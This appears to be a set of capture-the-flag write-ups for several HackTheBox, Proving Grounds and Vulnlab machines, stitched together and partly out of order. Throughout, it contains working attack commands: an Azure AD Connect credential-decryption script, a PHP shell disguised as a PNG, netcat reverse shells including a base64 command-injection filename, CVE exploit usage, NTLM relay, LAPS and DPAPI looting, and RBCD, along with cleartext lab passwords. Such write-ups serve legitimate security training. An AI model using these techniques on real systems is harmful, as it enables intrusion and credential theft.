$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()
add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)

Uploaded to evil-winrm and ran:

  • administrator:d0m@in4dminyeah!

docs.title: Lessons & takeaways
docs.text:
• Username-as-password is a real thing -- always spray users.txt against itself with --no-bruteforce
  • spider_plus can miss hidden shares like users$ -- use smbclient to check manually
  • Azure AD Connect stores encrypted domain admin credentials that can be decrypted if you have access to the ADSync database
  • Members of Azure Admins groups often have a direct path to Domain Admin

docs.text: Difficulty: Easy Box: Networked (HackTheBox) Author: dsec Date: 2025-07-01

docs.title: Uploaded a PHP shell disguised as PNG via magic bytes. Pivoted to guly user via command injection in a cron cleanup script. Privesc through network-scripts command injection with sudo.
Target info
docs.text:
• Host: 10.10.14.172 (attacker)
  • Services discovered: 22/tcp (ssh), 80/tcp (http)

docs.title: Exploitation -- initial shell
docs.text:
Converted shell.php to PNG by prepending magic bytes, then renamed extension in Burp:

printf '\x89PNG\r\n\x1A\n' | cat - shell.php > shell.png

Changed filename to shell.php.png in Burp:

Triggered the shell:

nc -c sh 10.10.14.172 4444

docs.title: Lateral movement -- apache to guly
docs.text:
Found a cleanup script that runs every 3 minutes:

The vulnerable line:

exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");

$value is a filename from the uploads directory -- no sanitization means command injection via crafted filenames.

Base64-encoded the working reverse shell:

echo nc -c sh 10.10.14.172 443 | base64 -w0
# bmMgLWMgc2ggMTAuMTAuMTQuMTcyIDQ0Mwo=

Created the injection file:

touch '/var/www/html/uploads/a; echo bmMgLWMgc2ggMTAuMTAuMTQuMTcyIDQ0Mwo= | base64 -d | sh; b'

After ~3 minutes:

docs.title: Privilege escalation
docs.text:
sudo -l

The script writes user input to /etc/sysconfig/network-scripts/ifcfg-guly then calls /sbin/ifup guly0. The regex allows spaces, so input separated by spaces becomes separate lines in the config. When the interface is brought up, the config is sourced, executing any injected commands.

  • Anything after a space in a network-scripts config value gets executed when the interface is brought up.

docs.title: Lessons & takeaways
docs.text:
• PHP shells can bypass upload filters by prepending PNG magic bytes
  • Cron scripts that use filenames in shell commands are injection targets
  • Network-scripts in CentOS/RHEL source config files -- spaces in values lead to command execution

docs.title: Port knocking & SSH
docs.text:
ps -auxww shows /usr/sbin/knockd running. Config at /etc/knockd.conf:

  • Open SSH by hitting ports 571, 290, then 911 with SYNs within 5 seconds.
for i in 571 290 911; do
  nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.129.222.16 >/dev/null
done; ssh -i id_rsa amrois@10.129.222.16

  • Worked on the second attempt.

docs.text:
Privesc via chkrootkit:

  • pspy shows processes running every minute referencing /usr/bin/chkrootkit.

docs.title: Lessons & takeaways
docs.text:
• When you find LFI and a way to write files (like phpLiteAdmin), chain them together for RCE
  • Pay attention to case sensitivity in parameters -- the capital N in Notes was required
  • Port knocking is rare but check for knockd in running processes if SSH is filtered
  • Always check cron jobs and recurring processes with pspy for privesc vectors

mkdir .ssh && cd .ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEqwSCwB7vK26CckpfDL1D0+/z6sf42jocBMLUsbca+m daniel@daniel" > authorized_keys

ssh -i id_ed25519 matt@panda.htb

docs.title: Privesc
docs.text:
Now the SUID binary could be run:

The binary used tar without a full path. Created a malicious tar in a writable directory and prepended it to PATH:

docs.title: Lessons & takeaways
docs.text:
• Always check for internal-only services via Apache/nginx site configs -- SSH port forwarding unlocks them
  • SNMP can leak credentials; don't skip UDP enumeration
  • When a shell is too limited for sudo/SUID exploitation, inject an SSH key for a proper interactive session
  • SUID binaries calling commands without full paths are vulnerable to PATH hijacking

Target info

• Host: pilgrimage.htb (added to /etc/hosts)
  • Services discovered: 22/tcp (ssh), 80/tcp (http)

docs.title: Enumeration
docs.text:
Port 80 redirects to pilgrimage.htb. Rescanned:

sudo nmap -p 22,80 -sCV pilgrimage.htb -vvv

Git repository found. Dumped it:

Used git checkout . to restore files.

Found magick binary. Reviewed source:

POST requests with images go to index.php -- saves file in /tmp:

Creates a new filename with uniqid():

Runs magick to shrink image by 50% and deletes original:

If logged in, saves path to DB:

Copy of magick in repo is executable:

ImageMagick 7.1.0-49 beta:

CVE-2022-44268 -- crafted PNG with tEXt chunk keyword "profile" makes ImageMagick read arbitrary files.

docs.title: Foothold
docs.text:
Used exploit from https://github.com/kljunowsky/CVE-2022-44268:

Created malicious pngout.png and uploaded to pilgrimage.htb:

Found user emily. No SSH keys found.

Found SQLite database filepath. Binary data caused the ASCII-expecting script to error, so extracted manually:

identify -verbose 66ddff730a36c.png | grep -Pv "^( |Image)" | xxd -r -p > pilgrimage.sqlite

  • emily:abigchonkyboi123

docs.title: Privilege escalation
docs.text:
Dirty Pipe didn't work.

ps aux

Root is running /usr/sbin/malwarescan.sh with inotifywait watching for file creations in /var/www/pilgrimage.htb/shrunk.

Uses binwalk to check files for executables:

Binwalk CVE-2022-4510 -- os.path.join doesn't resolve ../ sequences, allowing files to be placed in unintended locations (like SSH keys).

Generated SSH keys and crafted malicious PNG:

ssh-keygen -t ed25519 -f ./id_ed25519
python walkingpath.py ssh sample.png ./id_ed25519.pub
  • https://github.com/adhikara13/CVE-2022-4510-WalkingPath

Uploaded the exploit PNG:

scp ./binwalk_exploit.png emily@pilgrimage.htb:/var/www/pilgrimage.htb/shrunk/

SSH'd as root:

ssh -i id_ed25519 root@pilgrimage.htb

docs.title: Lessons & takeaways
docs.text:
• Exposed .git directories reveal source code and binary versions
  • ImageMagick CVE-2022-44268 reads arbitrary files via crafted PNG metadata
  • Binary file extraction from image metadata requires manual hex conversion
  • Binwalk path traversal (CVE-2022-4510) can plant SSH keys when a root process runs binwalk on user-controlled files

docs.title: Exploitation
docs.text:
LFI via browse.php:

http://10.129.1.254/browse.php?file=../../../../../../../etc/passwd

  • Found user charix

Used phpinfo to find the web root:

  • /usr/local/www/apache24/data

Read the password backup file via LFI:

http://10.129.1.254/browse.php?file=../../../../../../../usr/local/www/apache24/data/pwdbackup.txt

Used CyberChef -- kept adding "from Base64" decodes:

  • Password: Charix!2#4%6&8(0

docs.title: Privilege escalation
docs.text:
Transferred secret.zip from target:

scp charix@10.129.1.254:/home/charix/secret.zip .

Password reuse to unzip:

7z e -p'Charix!2#4%6&8(0' secret.zip

  • Contains a VNC password file

Checked for VNC:

netstat -an -p tcp

  • Ports 5801 and 5901 are VNC
ps -auwwx | grep vnc

  • VNC is running as root

SSH port forwarding didn't work, so used proxychains instead:

Added socks4 127.0.0.1 8081 to /etc/proxychains4.conf:

ssh charix@10.129.1.254 -D 8081
  • -D sets up dynamic application-level port forwarding (SOCKS proxy on port 8081)
proxychains vncviewer 127.0.0.1:5901 -passwd secret

docs.title: Lessons & takeaways
docs.text:
• Multiple rounds of base64 decoding -- keep going until you get plaintext
  • FreeBSD uses different flags (netstat -an -p tcp, ps -auwwx)
  • When SSH port forwarding fails, use proxychains with SSH dynamic forwarding (-D)
  • VNC password files can be reused with vncviewer -passwd

docs.title: Potato — Proving Grounds (write-up)
docs.text: Difficulty: Easy / Beginner Box: Potato (Proving Grounds) Author: dsec Date: 2025-09-22

docs.title: Initial web login didn’t accept the apparent credentials. Enumeration revealed hints in logs but no direct access. Final access came from an SSH brute force (nmap --script ssh-brute), which found webadmin:dragon. From there a small privilege escalation via notes file that can be run with sudo privileges allowed for root access.
Target info
docs.text:
• Host: 192.168.103.101 (and later 192.168.152.101 after a reset)
  • Services discovered: 22/tcp (ssh), 80/tcp (http), 2112/tcp (ftp)

docs.title: Enumeration
docs.text:
I started with basic network/service enumeration (nmap):

sudo nmap -Pn -n 192.168.103.101 -sCV -p- --open -vvv

Downloaded index.php.bak from open FTP service on atypical port 2112, which contained username and password, but did not work anywhere.

I also ran feroxbuster to fuzz for subdirectories:

feroxbuster -u http://192.168.152.101 -w /usr/share/wordlists/dirb/common.txt -n --add-slash

  • /admin exists and has a login page.

  • Fuzzing /admin revealed /logs subdirectory but was not useful. Logs only showed the password was changed a couple times.

docs.title: The .bak file suggested the admin:potato credential but it did not login. Tried other common combinations, but no luck. Knowing Offsec, this could be a rabbit hole.
Because the web login didn’t work and logs hinted at changes, I attempted an SSH brute force using nmap’s ssh-brute NSE script:
docs.text:
nmap -p 22 --script=/usr/share/nmap/scripts/ssh-brute.nse 192.168.152.101 -oN scans/nmap-ssh-brute.txt

Result: Found valid credentials webadmin:dragon

docs.title: I verified manually and connected via SSH.
Privesc
docs.text:
Once on the machine as webadmin I found some interesting sudo privileges via sudo -l:

Escalation step I used to get root: 

sudo /bin/nice /notes/../bin/sh

docs.title: Walkthrough / Correct path
docs.text:
• admin:potato looked promising (found in .bak file) but did not actually log in. The walkthrough referenced a strcmp bypass found in the .bak file. In short: the site code assumed the password POST parameter was a string and compared it using a string-compare routine. By editing the request and adding brackets to the variable in Burp and sending password[]= (i.e. making password an array), the server received the wrong type and the comparison behaved unexpectedly, allowing login as long as the username was correct. This is a type-validation bug. It works only because the application failed to validate input types before comparing credentials.

After that, use burp to proxy the logs section within the admin dashboard, which allows for an LFI.

/etc/passwd shows the hash for webadmin, which can be cracked very easily with john.

docs.title: The walkthrough also did the privesc slightly differently by creating a shell in the home directory and leveraging that with the sudo command instead of simply using the built in shell /bin/sh. Seems like an unneccesary extra step.
Lessons & takeaways
docs.text:
• Don’t overlook the code in a file, even if it appears to be leaking creds
  • When web login fails and enumeration hints at other services, pivot to other protocols (SSH, FTP, etc.). Although not very practical for a real engagement, SSH bruteforce on a CTF can sometimes work!

docs.text:
Found DPAPI Master Key and Credential Files for steph.cooper: - MasterKey: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 - CredFile: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9

Downloaded both .blob and .mkey files, then decrypted offline:

dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407.mkey -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'

  • DPAPIBlobHunter.exe can search for DPAPI blobs across a user's profile

docs.text: Difficulty: Hard Box: Reflection (Vulnlab) Author: dsec Date: 2025-10-12

docs.title: Multi-machine chain. MSSQL creds from SMB, NTLM relay via dirtree to get more creds, BloodHound showed GenericAll over machines -> LAPS password -> DPAPI loot -> RBCD to final workstation.
Target info
docs.text:
• Hosts: DC01 (10.10.245.101), MS01 (10.10.245.102), WS01
  • Domain: reflection.vl

docs.title: Enumeration
docs.text:
DC01:

SMB signing not required.

MS01:

docs.title: Initial access
docs.text:
Found MSSQL creds:

web_staging:Washroom510

docs.title: NTLM relay
docs.text:
Set up Responder and ntlmrelayx, then used dirtree command on MSSQL to trigger authentication:

ntlmrelayx opened an interactive SMB client shell, connected via nc:

Found more creds: web_prod:Tribesman201

Dumped from database:

  • abbie.smith:CMe1x+nlRaaWEw
  • dorothy.rose:hC_fny3OK9glSJ

docs.title: Lateral movement
docs.text:
BloodHound showed abbie.smith has GenericAll over MS01, and GPO LAPS is in use:

Read LAPS password:

Got: H447.++h6g5}xi

Found: svc_web_staging:DivinelyPacifism98

Used DPAPI with local admin on MS01:

netexec smb 10.10.245.246 -u administrator -p 'H447.++h6g5}xi' --dpapi --local-auth

Found: Georgia.Price:DBl+5MPkpJg5id

docs.title: Privilege escalation
docs.text:
Georgia.Price has GenericAll over WS01. Since we control svc_web_staging (which has an SPN), used RBCD:

rbcd.py -delegate-from 'svc_web_staging' -delegate-to 'WS01$' -action 'write' 'reflection.vl/Georgia.Price:DBl+5MPkpJg5id'


getST.py -spn 'cifs/WS01.reflection.vl' -impersonate 'dom_rgarner' 'reflection.vl/svc_web_staging:DivinelyPacifism98'

Found: Rhys.Garner:knh1gJ8Xmeq+uP

docs.title: Lessons & takeaways
docs.text:
• NTLM relay via MSSQL dirtree is powerful when SMB signing is disabled
  • DPAPI looting with netexec --dpapi --local-auth extracts Credential Manager secrets without touching LSASS
  • RBCD attack requires: GenericAll over target machine + control of an account with an SPN
  • Chain: MSSQL creds -> relay -> LAPS -> DPAPI -> RBCD is a clean multi-hop path
